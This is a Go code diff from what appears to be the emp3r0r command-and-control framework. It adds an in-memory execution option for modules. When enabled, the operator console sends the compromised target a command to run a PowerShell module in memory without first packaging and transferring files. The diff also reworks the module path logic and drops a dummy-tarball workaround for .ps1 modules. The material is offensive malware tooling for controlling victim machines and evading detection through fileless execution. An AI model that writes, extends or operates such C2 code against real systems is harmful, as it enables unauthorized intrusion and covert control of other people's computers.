@@ -37,6 +37,7 @@ import (
 type ModConfig struct {
 	Name          string `json:"name"`        // Display as this name
 	Exec          string `json:"exec"`        // Run this executable file
+	InMemory      bool   `json:"in_memory"`   // run this module in memory (for now ps1 is supported)
 	Platform      string `json:"platform"`    // targeting which OS? Linux/Windows
 	IsInteractive bool   `json:"interactive"` // whether run as a shell or not, eg. python, bettercap
 	Author        string `json:"author"`      // by whom
@@ -63,6 +64,8 @@ func moduleCustom() {
 		if CurrentTarget.GOOS == "windows" {
 			start_script = WWWRoot + CurrentMod + ".ps1"
 		}
+
+		// get module config
 		config, exists := ModuleConfigs[CurrentMod]
 		if !exists {
 			CliPrintError("Config of %s does not exist", CurrentMod)
@@ -89,16 +92,21 @@ func moduleCustom() {
 			}
 		}
 
+		// in-memory module
+		if config.InMemory {
+			cmd := fmt.Sprintf("%s %s %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, "in_mem")
+			cmd_id := uuid.NewString()
+			err = SendCmdToCurrentTarget(cmd, cmd_id)
+			if err != nil {
+				CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+			}
+			return
+		}
+
 		// compress module files
 		tarball := WWWRoot + CurrentMod + ".tar.xz"
 		CliPrintInfo("Compressing %s with xz...", CurrentMod)
 		path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
-
-		// if it's a powershell script, we just append it to start.ps1
-		// and let agent download a dummy tarball
-		if strings.HasSuffix(config.Exec, ".ps1") {
-			path = fmt.Sprintf("%s/dummy", config.Path, CurrentMod)
-		}
 		err = util.TarXZ(path, tarball)
 		if err != nil {
 			CliPrintError("Compressing %s: %v", CurrentMod, err)
@@ -279,7 +287,7 @@ func readModCondig(file string) (pconfig *ModConfig, err error) {
 
 // genStartScript reads config.json of a module
 func genStartScript(config *ModConfig, outfile string) error {
-	module_exec_path := fmt.Sprintf("%s/%s", config.Path, config.Exec)
+	module_exec_path := fmt.Sprintf("%s/%s/%s", config.Path, config.Name, config.Exec)
 	var builder strings.Builder
 
 	setEnvVar := func(opt, value string) {
